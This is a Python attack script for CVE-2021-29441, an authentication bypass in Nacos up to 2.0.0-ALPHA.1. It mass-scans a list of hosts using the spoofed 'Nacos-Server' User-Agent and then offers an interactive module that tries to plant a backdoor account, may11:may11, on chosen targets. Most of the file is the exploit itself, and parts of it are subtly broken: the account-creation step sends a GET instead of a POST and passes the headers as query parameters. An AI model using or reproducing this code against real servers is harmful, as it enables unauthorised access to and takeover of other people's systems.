# -*- coding: utf-8 -*-
# @Author : may11
# @Time : 2023/11/30 10:36
# @version : Nacos <= 2.0.0-ALPHA.1
# @CVE-2021-29441


from queue import Queue
import requests
import threading

headers = {
    'User-Agent': 'Nacos-Server',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1',
}


def get_URL(ip):
    URL='http://'+ip+'/nacos/v1/auth/users?pageNo=1&pageSize=2'
    return URL
def get_target(ip):
    target='http://'+ip+'/nacos/v1/auth/users?username=may11&password=may11'
    return target
def check_URL(text,ip):
    with lock:
        if "username" in text:
            print(f'''{ip} 存在漏洞！''')
            result.add(ip)
        else:
            print(f'''{ip} 不存在漏洞！''')

class Mythread(threading.Thread):
    def __init__(self,queue):
        super().__init__()
        self.queue=queue
    def run(self):
        while True:
            URL=self.queue.get()
            target=get_URL(URL)
            try:
                response = requests.get(
                    target,
                    headers=headers
                )
                check_URL(response.text, URL)
            except Exception:
                with threading.Lock():
                    print(f"{URL} 不可达！")
            queue.task_done()
lock=threading.Lock()
queue = Queue()
result=set()
print("----------漏洞扫描开始----------")
for i in open("url.txt"):
    queue.put(i.strip())

for i in range(5):
    mythread = Mythread(queue)
    mythread.setDaemon(True)
    mythread.start()
queue.join()
print("----------漏洞扫描结束----------")
print("----------结果输出如下----------")
for i in result:
    print(i)
print("----------漏洞利用模块----------")
while True:
    target = input("请输入目标URL(输入exit退出): ").strip()
    if target == 'exit':
        break
    target_1 = get_target(target)
    try:
        requests = requests.get(
            target_1,
            headers
        )
        print(f'''{target} 漏洞利用成功！请使用may11:may11进行登录！''')
    except Exception:
        print(f'''{target} 漏洞利用失败！''')
print("----------漏洞利用结束----------")


